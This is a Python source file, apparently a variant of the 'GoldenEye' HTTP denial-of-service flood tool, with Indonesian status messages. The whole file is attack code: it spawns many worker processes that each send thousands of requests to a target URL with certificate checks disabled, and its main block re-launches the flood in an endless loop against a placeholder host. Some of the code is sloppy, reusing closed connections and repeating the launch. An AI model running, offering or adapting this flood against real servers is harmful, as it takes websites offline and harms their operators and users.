from multiprocessing import Process, Manager
import urllib.parse, ssl, sys, random, time, os, http.client

# Define constants for retry logic
MAX_RETRIES = 5
RETRY_INTERVAL = 5  # seconds

class GoldenEye:
    # Initialize the class
    def __init__(self, url, nr_workers=10, nr_sockets=500, method='get'):
        self.url = url
        self.nr_workers = nr_workers
        self.nr_sockets = nr_sockets
        self.method = method
        self.manager = Manager()
        self.counter = self.manager.list([0, 0])
        self.workersQueue = []

    # Function to start the attack
    def fire(self):
        print(f"Hitting webserver in mode '{self.method}' with {self.nr_workers} workers running {self.nr_sockets} connections each. Hit CTRL+C to cancel.")
        for i in range(int(self.nr_workers)):
            worker = Striker(self.url, self.nr_sockets, self.counter, self.method)
            self.workersQueue.append(worker)
            worker.start()

        self.monitor()

    # Function to monitor the workers
    def monitor(self):
        while len(self.workersQueue) > 0:
            for worker in self.workersQueue:
                if worker.is_alive():
                    worker.join(1.0)
                else:
                    self.workersQueue.remove(worker)
            self.stats()

    # Function to print statistics
    def stats(self):
        if self.counter[0] > 0 or self.counter[1] > 0:
            print(f"{self.counter[0]} GoldenEye strikes hit. ({self.counter[1]} Failed)")

# Worker class to handle the actual request sending
class Striker(Process):
    def __init__(self, url, nr_sockets, counter, method):
        super().__init__()
        self.url = url
        self.nr_sockets = nr_sockets
        self.counter = counter
        self.method = method
        self.host, self.path = self._parse_url(url)
        self.ssl = url.startswith('https')
        self.port = 443 if self.ssl else 80

    # Parse the URL to get host and path
    def _parse_url(self, url):
        parsed_url = urllib.parse.urlparse(url)
        return parsed_url.netloc, parsed_url.path or '/'

    # Increment the success counter
    def inc_counter(self):
        self.counter[0] += 1

    # Increment the failure counter
    def inc_failed(self):
        self.counter[1] += 1

    # Main run method for the worker
    def run(self):
        retries = 0
        while retries < MAX_RETRIES:
            try:
                self._perform_attack()
                self.inc_counter()
                break
            except Exception as e:
                self.inc_failed()
                retries += 1
                print(f"Failed attempt {retries}/{MAX_RETRIES}: {e}")
                if retries < MAX_RETRIES:
                    time.sleep(RETRY_INTERVAL)
                else:
                    print("Max retries reached. Skipping this worker.")

    # Perform the actual attack
    def _perform_attack(self):
        connection = self._create_connection()
        for _ in range(self.nr_sockets):
            self._send_request(connection)

    # Create a HTTP/HTTPS connection
    def _create_connection(self):
        if self.ssl:
            return http.client.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())
        else:
            return http.client.HTTPConnection(self.host, self.port)

    # Send the HTTP request
    def _send_request(self, connection):
        headers = {'User-Agent': 'Mozilla/5.0'}
        connection.request(self.method.upper(), self.path, headers=headers)
        response = connection.getresponse()
        response.read()
        connection.close()

# Usage example

if __name__ == '__main__':
    url = 'http://example.com'
    while True:
        try:
            print("Menjalankan GoldenEye...")
            golden_eye = GoldenEye(url, nr_workers=15, nr_sockets=9999, method='get')
            golden_eye.fire()
            print("GoldenEye selesai. Mengulangi kembali...")
        except KeyboardInterrupt:
            print("Dihentikan oleh pengguna.")
            break
        except Exception as e:
            print(f"Terjadi error: {e}. Mengulangi kembali...")
        
    url = 'http://example.com'
    golden_eye = GoldenEye(url, nr_workers=15, nr_sockets=9999, method='get')
    golden_eye.fire()
